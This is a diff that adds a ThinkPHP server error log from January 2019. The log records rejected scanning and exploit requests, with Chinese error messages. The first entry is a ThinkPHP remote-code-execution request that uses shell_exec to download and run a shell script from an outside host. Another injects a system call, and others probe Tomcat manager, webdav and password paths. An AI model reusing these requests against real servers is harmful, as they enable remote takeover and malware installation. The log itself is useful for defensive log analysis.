@@ -1,0 +1,30 @@
+[ 2019-01-28T03:31:02+08:00 ] 185.244.25.128 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://infinityondemand.club/bins/infinity.sh;%20chmod%20+x%20infinity.sh;%20sh%20infinity.sh%20
+ERR: 非法操作:\think\app
+
+[ 2019-01-28T06:26:17+08:00 ] 51.68.173.240 /index.php?s=/index/%5Cthink%5Crequest/cache&key=id%7Csystem
+ERR: 非法操作:\think\request
+
+[ 2019-01-28T09:12:13+08:00 ] 60.190.56.6 /manager/html
+ERR: 无法加载控制器:Manager
+
+[ 2019-01-28T12:40:35+08:00 ] 113.57.114.218 /fdsrwe
+ERR: 无法加载控制器:Fdsrwe
+
+[ 2019-01-28T12:40:37+08:00 ] 113.57.114.218 /currentsetting.htm
+ERR: 无法加载控制器:Currentsetting.htm
+
+[ 2019-01-28T12:40:43+08:00 ] 113.57.114.218 /login.html
+ERR: 无法加载控制器:Login
+
+[ 2019-01-28T12:40:43+08:00 ] 113.57.114.218 /device_description.xml
+ERR: 无法加载控制器:Device_description.xml
+
+[ 2019-01-28T12:40:43+08:00 ] 113.57.114.218 /current_config/passwd
+ERR: 无法加载控制器:Current_config
+
+[ 2019-01-28T16:05:54+08:00 ] 117.50.22.135 /webdav/
+ERR: 无法加载控制器:Webdav
+
+[ 2019-01-28T16:06:22+08:00 ] 117.50.22.135 /manager/html
+ERR: 无法加载控制器:Manager
+
